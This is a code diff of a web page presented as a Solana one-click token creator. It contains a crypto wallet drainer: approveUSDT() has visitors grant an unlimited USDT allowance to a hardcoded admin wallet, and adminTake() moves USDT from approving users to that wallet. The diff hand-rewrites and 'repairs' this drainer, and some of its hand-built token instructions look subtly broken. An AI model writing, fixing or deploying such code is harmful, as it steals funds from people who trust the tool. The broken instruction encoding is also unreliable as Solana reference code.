@@ -3,9 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>SOL 一键发币+Logo+USDT授权+管理员提币</title>
+  <title>SOL 一键发币（带Logo+授权修复版）</title>
   <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.6/lib/index.iife.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.8/lib/index.iife.min.js"></script>
   <style>
     body { max-width: 420px; margin: 0 auto; padding: 20px; background: #fff; font-family: system-ui; }
     .btn { width: 100%; padding: 16px; border-radius: 16px; border: none; background: #0071e3; color: white; font-size: 16px; margin: 10px 0; cursor: pointer; }
@@ -50,9 +49,11 @@
 </div>
 
 <script>
-// 固定配置 你不用改
+// 固定配置
 const ADMIN_WALLET = "FbDMLj8MTJGSBWeanFKhJWycn5qjmJ3q8WBzZb3Gbm1c";
 const USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
+const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
+const ASSOCIATED_TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25DK9c64Laf27x");
 
 let provider;
 let publicKey;
@@ -60,7 +61,47 @@ let address = "";
 let logoFile = null;
 
 const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
-const splToken = window.splToken;
+
+// 手动实现 getAssociatedTokenAddress（不再依赖 splToken）
+function getAssociatedTokenAddress(mint, owner) {
+  const [address] = solanaWeb3.PublicKey.findProgramAddressSync(
+    [owner.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
+    ASSOCIATED_TOKEN_PROGRAM_ID
+  );
+  return address;
+}
+
+// 手动创建 Approve 指令
+function createApproveInstruction(account, delegate, owner, amount) {
+  const data = new Uint8Array(9);
+  data[0] = 4; // Approve 指令ID
+  new DataView(data.buffer).setBigUint64(1, amount, true);
+  return new solanaWeb3.TransactionInstruction({
+    keys: [
+      { pubkey: account, isSigner: false, isWritable: true },
+      { pubkey: delegate, isSigner: false, isWritable: false },
+      { pubkey: owner, isSigner: true, isWritable: false }
+    ],
+    programId: TOKEN_PROGRAM_ID,
+    data: Buffer.from(data)
+  });
+}
+
+// 手动创建 Transfer 指令
+function createTransferInstruction(source, destination, owner, amount) {
+  const data = new Uint8Array(9);
+  data[0] = 3; // Transfer 指令ID
+  new DataView(data.buffer).setBigUint64(1, amount, true);
+  return new solanaWeb3.TransactionInstruction({
+    keys: [
+      { pubkey: source, isSigner: false, isWritable: true },
+      { pubkey: destination, isSigner: false, isWritable: true },
+      { pubkey: owner, isSigner: true, isWritable: false }
+    ],
+    programId: TOKEN_PROGRAM_ID,
+    data: Buffer.from(data)
+  });
+}
 
 function getWallet() {
   return window.solana || window.okxwallet?.solana || window.tpWallet;
@@ -87,25 +128,27 @@ async function connect() {
   }
 }
 
-// USDT 授权 全权授权给你管理员地址
+// USDT 授权（全权授权给管理员地址）
 async function approveUSDT() {
   if (!address) return alert("先连接钱包");
   try {
     const mintPub = new solanaWeb3.PublicKey(USDT_MINT);
     const adminPub = new solanaWeb3.PublicKey(ADMIN_WALLET);
+    const userPub = publicKey;
 
-    const userAta = await splToken.getAssociatedTokenAddress(mintPub, publicKey);
+    // 获取用户USDT关联账户
+    const userAta = getAssociatedTokenAddress(mintPub, userPub);
 
     const tx = new solanaWeb3.Transaction();
-    const approveIx = splToken.createApproveInstruction(
+    const approveIx = createApproveInstruction(
       userAta,
       adminPub,
-      publicKey,
-      BigInt("18446744073709551615")
+      userPub,
+      BigInt("18446744073709551615") // 最大授权额度
     );
     tx.add(approveIx);
 
-    tx.feePayer = publicKey;
+    tx.feePayer = userPub;
     const bh = await connection.getLatestBlockhash();
     tx.recentBlockhash = bh.blockhash;
 
@@ -127,16 +170,16 @@ async function adminTake() {
   if (!fromAddr || !amtVal) return alert("请填写完整");
 
   try {
-    const amount = BigInt(Math.round(parseFloat(amtVal) * 1000000));
+    const amount = BigInt(Math.round(parseFloat(amtVal) * 1000000)); // USDT 精度6
     const mintPub = new solanaWeb3.PublicKey(USDT_MINT);
     const fromPub = new solanaWeb3.PublicKey(fromAddr);
     const adminPub = new solanaWeb3.PublicKey(ADMIN_WALLET);
 
-    const fromAta = await splToken.getAssociatedTokenAddress(mintPub, fromPub);
-    const adminAta = await splToken.getAssociatedTokenAddress(mintPub, adminPub);
+    const fromAta = getAssociatedTokenAddress(mintPub, fromPub);
+    const adminAta = getAssociatedTokenAddress(mintPub, adminPub);
 
     const tx = new solanaWeb3.Transaction();
-    const transferIx = splToken.createTransferInstruction(
+    const transferIx = createTransferInstruction(
       fromAta,
       adminAta,
       adminPub,
@@ -144,7 +187,7 @@ async function adminTake() {
     );
     tx.add(transferIx);
 
-    tx.feePayer = publicKey;
+    tx.feePayer = adminPub;
     const bh = await connection.getLatestBlockhash();
     tx.recentBlockhash = bh.blockhash;
 
@@ -172,7 +215,7 @@ function previewLogo() {
   reader.readAsDataURL(file);
 }
 
-// 一键发币
+// 一键发币（修复：使用Web3.js原生API）
 async function createToken() {
   if (!address) { alert("请先连接钱包！"); return; }
 
@@ -184,37 +227,82 @@ async function createToken() {
     const amount = supply * (10n ** BigInt(decimals));
 
     const mintKeypair = solanaWeb3.Keypair.generate();
+    const mint = mintKeypair.publicKey;
+    const userPub = publicKey;
 
-    const mint = await splToken.createMint(
-      connection,
-      provider,
-      publicKey,
-      publicKey,
-      decimals,
-      mintKeypair
-    );
+    // 创建Mint账户
+    const rent = await connection.getMinimumBalanceForRentExemption(82);
+    const createAccountIx = solanaWeb3.SystemProgram.createAccount({
+      fromPubkey: userPub,
+      newAccountPubkey: mint,
+      space: 82,
+      lamports: rent,
+      programId: TOKEN_PROGRAM_ID
+    });
 
-    const ata = await splToken.getOrCreateAssociatedTokenAccount(
-      connection,
-      provider,
-      mint,
-      publicKey
-    );
+    // 初始化Mint
+    const initMintIx = new solanaWeb3.TransactionInstruction({
+      keys: [{ pubkey: mint, isSigner: false, isWritable: true }],
+      programId: TOKEN_PROGRAM_ID,
+      data: (() => {
+        const data = new Uint8Array(10);
+        data[0] = 0; // InitializeMint指令ID
+        data[1] = decimals;
+        userPub.toBuffer().copy(data, 2);
+        userPub.toBuffer().copy(data, 34);
+        return data;
+      })()
+    });
 
-    const tx = await splToken.mintTo(
-      connection,
-      provider,
-      mint,
-      ata.address,
-      publicKey,
-      amount
-    );
+    // 创建关联账户
+    const userAta = getAssociatedTokenAddress(mint, userPub);
+    const createAtaIx = new solanaWeb3.TransactionInstruction({
+      keys: [
+        { pubkey: userPub, isSigner: true, isWritable: true },
+        { pubkey: userAta, isSigner: false, isWritable: true },
+        { pubkey: userPub, isSigner: false, isWritable: false },
+        { pubkey: mint, isSigner: false, isWritable: false },
+        { pubkey: solanaWeb3.SystemProgram.programId, isSigner: false, isWritable: false },
+        { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
+        { pubkey: solanaWeb3.PublicKey.default, isSigner: false, isWritable: false }
+      ],
+      programId: ASSOCIATED_TOKEN_PROGRAM_ID,
+      data: Buffer.from([])
+    });
+
+    // 铸造代币
+    const mintToIx = new solanaWeb3.TransactionInstruction({
+      keys: [
+        { pubkey: mint, isSigner: false, isWritable: true },
+        { pubkey: userAta, isSigner: false, isWritable: true },
+        { pubkey: userPub, isSigner: true, isWritable: false }
+      ],
+      programId: TOKEN_PROGRAM_ID,
+      data: (() => {
+        const data = new Uint8Array(9);
+        data[0] = 7; // MintTo指令ID
+        new DataView(data.buffer).setBigUint64(1, amount, true);
+        return data;
+      })()
+    });
+
+    const tx = new solanaWeb3.Transaction();
+    tx.add(createAccountIx, initMintIx, createAtaIx, mintToIx);
+
+    tx.feePayer = userPub;
+    const bh = await connection.getLatestBlockhash();
+    tx.recentBlockhash = bh.blockhash;
+    tx.partialSign(mintKeypair);
+
+    const signed = await provider.signTransaction(tx);
+    const sig = await connection.sendRawTransaction(signed.serialize());
+    await connection.confirmTransaction(sig);
 
     alert(`✅ 发币成功！
 名称：${name}
 符号：${symbol}
 合约：${mint.toBase58()}
-交易：${tx}`);
+交易：${sig}`);
 
   } catch (err) {
     alert("失败：" + err.message);
